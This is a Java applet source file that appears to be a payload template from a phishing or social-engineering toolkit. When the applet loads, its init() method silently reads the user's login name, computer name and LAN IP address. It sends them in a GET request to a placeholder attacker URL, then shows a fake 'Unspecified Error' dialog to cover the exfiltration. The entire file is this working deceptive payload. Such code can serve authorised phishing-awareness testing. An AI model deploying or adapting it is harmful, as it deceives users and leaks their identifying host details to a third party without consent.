import java.applet.Applet;
import java.net.InetAddress;
import java.awt.*;
import java.net.UnknownHostException;
import java.net.*;
import java.util.Enumeration;
import javax.swing.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class applet extends Applet {

  private static InetAddress getLocalHostLANAddress() throws UnknownHostException {
    try {
      InetAddress candidateAddress = null;
      // Iterate all NICs (network interface cards)...
      for (Enumeration ifaces = NetworkInterface.getNetworkInterfaces(); ifaces.hasMoreElements();) {
        NetworkInterface iface = (NetworkInterface) ifaces.nextElement();
        // Iterate all IP addresses assigned to each card...
        for (Enumeration inetAddrs = iface.getInetAddresses(); inetAddrs.hasMoreElements();) {
          InetAddress inetAddr = (InetAddress) inetAddrs.nextElement();
          if (!inetAddr.isLoopbackAddress()) {

            if (inetAddr.isSiteLocalAddress()) {
              // Found non-loopback site-local address. Return it immediately...
              return inetAddr;
            }
            else if (candidateAddress == null) {
              // Found non-loopback address, but not necessarily site-local.
              // Store it as a candidate to be returned if site-local address is not subsequently found...
              candidateAddress = inetAddr;
              // Note that we don't repeatedly assign non-loopback non-site-local addresses as candidates,
              // only the first. For subsequent iterations, candidate will be non-null.
            }
          }
        }
      }
      if (candidateAddress != null) {
        // We did not find a site-local address, but we found some other non-loopback address.
        // Server might have a non-site-local address assigned to its NIC (or it might be running
        // IPv6 which deprecates the "site-local" concept).
        // Return this non-loopback candidate address...
        return candidateAddress;
      }
      // At this point, we did not find a non-loopback address.
      // Fall back to returning whatever InetAddress.getLocalHost() returns...
      InetAddress jdkSuppliedAddress = InetAddress.getLocalHost();
      if (jdkSuppliedAddress == null) {
        throw new UnknownHostException("The JDK InetAddress.getLocalHost() method unexpectedly returned null.");
      }
      return jdkSuppliedAddress;
    }
    catch (Exception e) {
      UnknownHostException unknownHostException = new UnknownHostException("Failed to determine LAN address: " + e);
      unknownHostException.initCause(e);
      throw unknownHostException;
    }
  }

  public void init()
  {
    String username;
    String hostname;
    String ip;
    String base_url = "{{BASE_URL}}";
    String link;

    try {
      username = System.getProperty("user.name");
      hostname = InetAddress.getLocalHost().getHostName();
      ip = getLocalHostLANAddress().getHostAddress();
      link = base_url + "&username=" + username + "&computername=" + hostname + "&ip=" + ip + "&payload=Java";
      URL obj = new URL(link);
      HttpURLConnection con = (HttpURLConnection) obj.openConnection();
      con.setRequestMethod("GET");
      int responseCode = con.getResponseCode();
      JOptionPane.showMessageDialog(null, "Error: An Unspecified Error Occurred.");
    } catch(Exception e) {

    }

  }
}
